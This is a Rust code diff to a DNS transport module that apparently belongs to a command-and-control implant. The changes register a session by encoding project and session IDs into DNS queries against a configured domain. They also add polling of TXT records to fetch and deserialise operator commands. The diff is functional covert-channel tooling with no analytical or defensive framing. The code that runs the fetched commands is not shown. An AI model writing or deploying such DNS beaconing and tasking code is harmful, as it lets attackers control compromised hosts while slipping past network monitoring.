@@ -6,10 +6,13 @@ use rand::Rng;
 
 use crate::transport::Transport;
 use crate::session::Session;
+use crate::command::CommandInfo;
 
 pub struct DNS {
     pub server: String,
     pub domain: String,
+
+    session: Session,
 
     resolver: Resolver,
 }
@@ -23,11 +26,11 @@ fn generate_blob(length: usize) -> String {
 }
 
 impl Transport for DNS {
-    fn register_session(&self, session: Session) -> Result<(), String> {
+    fn register_session(&self) -> Result<(), String> {
         let query = format!(
             "{}.{}.{}.{}",
-            session.project_id,
-            session.id,
+            self.session.project_id,
+            self.session.id,
             generate_blob(4),
             self.domain
         );
@@ -36,15 +39,44 @@ impl Transport for DNS {
             Ok(_) => {
                 Ok(())
             }
-            Err(_) => {
-                Err("Could not register session".to_string())
+            Err(e) => {
+                Err(format!("Failed to register session: {}", e))
             }
         }
+    }
+
+    fn command_info(&self) -> Result<Option<CommandInfo>, String> {
+        let query = format!(
+            "{}.{}.{}",
+            self.session.id,
+            generate_blob(4),
+            self.domain,
+        );
+
+        match self.resolver.txt_lookup(query) {
+            Ok(resp) => {
+                let response = resp.as_lookup().record_iter()
+                    .filter_map(|record| record.data()?.as_txt().map(|txt| txt.to_string()))
+                    .collect::<Vec<_>>()
+                    .join(""); // Use join to convert Vec<String> to a single String
+
+                if response == "null" {
+                    return Ok(None)
+                }
+
+                match serde_json::from_str(response.as_str()) {
+                    Ok(cmd_info) => return Ok(Some(cmd_info)),
+                    Err(e) => println!("Error deserializing the data: {}", e)
+                }
+            },
+            Err(_) => {}
+        }
+        return Ok(None)
     }
 }
 
 impl DNS {
-    pub fn new<'a>(server: String, domain: String) -> DNS {
+    pub fn new(server: String, domain: String, session: Session) -> DNS {
         let resolver;
         if server == "" {
             resolver = Resolver::from_system_conf().unwrap()
@@ -64,6 +96,7 @@ impl DNS {
         DNS {
             server,
             domain,
+            session,
             resolver,
         }
     }
